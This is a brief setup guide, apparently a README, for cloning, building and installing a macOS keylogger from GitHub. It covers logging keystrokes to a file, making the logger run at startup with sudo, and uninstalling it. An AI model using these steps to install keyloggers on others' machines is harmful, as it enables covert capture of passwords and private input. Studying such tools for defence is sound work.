# Keylogger Setup
—-----------------------<br>
## Installation
$ git clone https://github.com/GiacomoLaw/Keylogger && cd keylogger/mac
$ make && make install
—-----------------------<br>
## Create File
$ touch ~/logfile.txt
—-----------------------<br>
## Start Logging
$ keylogger ~/logfile.txt
—-----------------------<br>
## File Location
/Users/yourname/logfile.txt
—-----------------------<br>
## Start on Startup
$ sudo make startup
—-----------------------<br>
## Uninstall
$ sudo make uninstall
—-----------------------<br>
